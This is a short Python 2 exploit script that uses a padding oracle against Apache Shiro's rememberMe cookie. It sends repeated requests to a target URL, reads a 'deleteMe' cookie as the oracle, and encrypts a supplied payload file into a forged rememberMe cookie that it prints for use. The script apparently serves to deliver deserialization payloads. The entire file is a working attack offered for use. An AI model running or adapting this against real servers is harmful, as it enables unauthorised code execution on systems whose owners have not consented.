# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        # self.session.cookies['JSESSIONID'] = '72567E35F327ECE1609025C05FE12976'
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)
        self.session.cookies['rememberMe'] = somecookie
        if self.session.cookies.get('JSESSIONID'):
            del self.session.cookies['JSESSIONID']

        # logging.debug(self.session.cookies)

        while 1:
            try:
                response = self.session.get(sys.argv[1],
                        stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        # logging.debug(response.headers)

        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):
            logging.debug('No padding exception raised on %r', somecookie)
            return

        # logging.debug("Padding exception")
        raise BadPaddingException


if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[3:]:
        print 'Usage: %s <url> <somecookie value> <payload>' % (sys.argv[0], )
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)
    encrypted_cookie = b64decode(unquote(sys.argv[2]))

    padbuster = PadBuster()

    payload = open(sys.argv[3], 'rb').read()

    enc = padbuster.encrypt(plaintext=payload, block_size=16)

    # cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

    # print('Decrypted somecookie: %s => %r' % (sys.argv[1], enc))
    print('rememberMe cookies:')
    print(b64encode(enc))